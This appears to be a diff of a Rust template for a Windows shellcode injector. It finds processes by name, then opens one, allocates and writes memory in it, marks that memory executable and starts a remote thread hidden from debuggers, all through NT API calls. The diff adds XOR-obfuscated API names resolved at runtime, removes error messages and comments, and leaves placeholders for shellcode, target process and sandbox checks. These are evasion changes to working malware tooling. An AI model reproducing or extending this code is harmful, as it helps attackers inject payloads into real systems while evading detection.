@@ -2,31 +2,21 @@
 #![allow(non_snake_case)]
 
 use sysinfo::System;
-use std::ffi::OsStr;
+use std::ffi::{CString, OsStr};
 use std::include_bytes;
+use std::ptr::null_mut;
 
 use winapi::{
     um::{
-        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE},
-        lmaccess::{ACCESS_ALL}
+        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, PAGE_EXECUTE_READ, THREAD_ALL_ACCESS},
+        lmaccess::ACCESS_ALL,
+        libloaderapi::{GetModuleHandleA, GetProcAddress},
     },
     shared::{
-        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
-    }
+        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS},
+    },
+    ctypes::c_void,
 };
-use winapi::ctypes::c_void;
-use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
-use ntapi::ntpsapi::THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER;
-use std::{ptr::null_mut};
-use winapi::um::winnt::THREAD_ALL_ACCESS;
-use ntapi::ntapi_base::CLIENT_ID;
-use ntapi::ntpsapi::NtOpenProcess;
-use ntapi::ntmmapi::NtAllocateVirtualMemory;
-use ntapi::ntmmapi::NtWriteVirtualMemory;
-use ntapi::ntmmapi::NtProtectVirtualMemory;
-use ntapi::ntpsapi::NtCreateThreadEx;
-//use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;
-
 
 {{IMPORTS}}
 
@@ -34,78 +24,90 @@ use ntapi::ntpsapi::NtCreateThreadEx;
 
 {{DECRYPTION_FUNCTION}}
 
+const HIDE_FROM_DEBUGGER: u32 = 0x4;
+
+#[repr(C)]
+struct CID {
+    proc_id: HANDLE,
+    thread_id: HANDLE,
+}
+
+const K: u8 = {{API_KEY}};
+const OBF_A: &[u8] = &{{OBF_NT_OPEN_PROCESS}};
+const OBF_B: &[u8] = &{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}};
+const OBF_C: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
+const OBF_D: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
+const OBF_E: &[u8] = &{{OBF_NT_CREATE_THREAD_EX}};
+
+fn r(d: &[u8]) -> Vec<u8> {
+    d.iter().map(|b| b ^ K).collect()
+}
+
+unsafe fn g(n: &[u8]) -> *const () {
+    let h = GetModuleHandleA(b"ntdll\0".as_ptr() as *const i8);
+    let s = r(n);
+    let c = CString::new(s).unwrap();
+    GetProcAddress(h, c.as_ptr()) as *const ()
+}
+
+type FA = unsafe extern "system" fn(*mut HANDLE, u32, *mut OBJECT_ATTRIBUTES, *mut CID) -> i32;
+type FB = unsafe extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
+type FC = unsafe extern "system" fn(HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
+type FD = unsafe extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
+type FE = unsafe extern "system" fn(*mut HANDLE, u32, *mut c_void, HANDLE, *mut c_void, *mut c_void, u32, usize, usize, usize, *mut c_void) -> i32;
+
 fn boxboxbox(tar: &str) -> Vec<usize> {
-    // search for processes to inject into
     let mut dom: Vec<usize> = Vec::new();
     let s = System::new_all();
     for pro in s.processes_by_exact_name(OsStr::new(tar)) {
-        //println!("{} {}", pro.pid(), pro.name());
         dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
     }
     dom
 }
 
 fn enhance(mut buf: Vec<u8>, tar: usize) {
-    // injecting in target processes :)
     let mut process_handle = tar as HANDLE;
     let mut oa = OBJECT_ATTRIBUTES::default();
-    let mut ci = CLIENT_ID {
-        UniqueProcess: process_handle,
-        UniqueThread: null_mut(),
+    let mut ci = CID {
+        proc_id: process_handle,
+        thread_id: null_mut(),
     };
 
     unsafe {
-        let open_status = NtOpenProcess(&mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
-        if !NT_SUCCESS(open_status) {
-            panic!("Error opening process: {}", open_status);
-        }
+        let f_open: FA = std::mem::transmute(g(OBF_A));
+        let f_alloc: FB = std::mem::transmute(g(OBF_B));
+        let f_write: FC = std::mem::transmute(g(OBF_C));
+        let f_protect: FD = std::mem::transmute(g(OBF_D));
+        let f_thread: FE = std::mem::transmute(g(OBF_E));
 
-        let mut allocstart : *mut c_void = null_mut();
-        let mut size : usize = buf.len();
-        let alloc_status = NtAllocateVirtualMemory(process_handle, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if !NT_SUCCESS(alloc_status) {
-            panic!("Error allocating memory to the target process: {}", alloc_status);
-        }
-        let mut byteswritten = 0;
-        let buffer = buf.as_mut_ptr() as *mut c_void;
-        let mut buffer_length = buf.len();
-        let write_status = NtWriteVirtualMemory(process_handle, allocstart, buffer, buffer_length, &mut byteswritten);
-        if !NT_SUCCESS(write_status) {
-            panic!("Error writing to the target process: {}", write_status);
-        }
+        let s = f_open(&mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
+        if !NT_SUCCESS(s) { return; }
 
-        let mut old_perms = PAGE_READWRITE;
-        let protect_status = NtProtectVirtualMemory(process_handle, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
-        if !NT_SUCCESS(protect_status) {
-            panic!("[-] Failed to call NtProtectVirtualMemory: {:#x}", protect_status);
-        }
+        let mut base: *mut c_void = null_mut();
+        let mut size: usize = buf.len();
+        let s = f_alloc(process_handle, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if !NT_SUCCESS(s) { return; }
 
-        let mut thread_handle : *mut c_void = null_mut();
-        let write_thread = NtCreateThreadEx(&mut thread_handle, THREAD_ALL_ACCESS, null_mut(), process_handle, allocstart, null_mut(), THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, 0_usize, 0_usize, 0_usize, null_mut());
+        let mut written = 0;
+        let ptr = buf.as_mut_ptr() as *mut c_void;
+        let len = buf.len();
+        let s = f_write(process_handle, base, ptr, len, &mut written);
+        if !NT_SUCCESS(s) { return; }
 
-        if !NT_SUCCESS(write_thread) {
-            panic!("Error failed to create remote thread: {}", write_thread);
-        }
+        let mut old: u32 = PAGE_READWRITE;
+        let mut psize = len;
+        let s = f_protect(process_handle, &mut base, &mut psize, PAGE_EXECUTE_READ, &mut old);
+        if !NT_SUCCESS(s) { return; }
+
+        let mut th: HANDLE = null_mut();
+        f_thread(&mut th, THREAD_ALL_ACCESS, null_mut(), process_handle, base, null_mut(), HIDE_FROM_DEBUGGER, 0, 0, 0, null_mut());
     }
 }
 
 fn main() {
     {{SANDBOX}}
     
-    // inject in the following processes:
     let tar: &str = "{{TARGET_PROCESS}}";
-
-    // Removing the sandobox check for now, as it fails on numerous Windows versions.
-    /*
-    let mut memory = 0;
-    unsafe {
-        let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
-        println!("{:#?}", is_quicksand);
-        if is_quicksand != 1 {
-            panic!("Hello.")
-        }
-    }
-    */
 
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
     let mut vec: Vec<u8> = Vec::new();
@@ -113,9 +115,7 @@ fn main() {
         vec.push(*i);
     }
     let list: Vec<usize> = boxboxbox(tar);
-    if list.is_empty() {
-        panic!("[-] Unable to find a process.")
-    } else {
+    if !list.is_empty() {
         for i in &list {
             {{MAIN}}
             enhance(vec.clone(), *i);
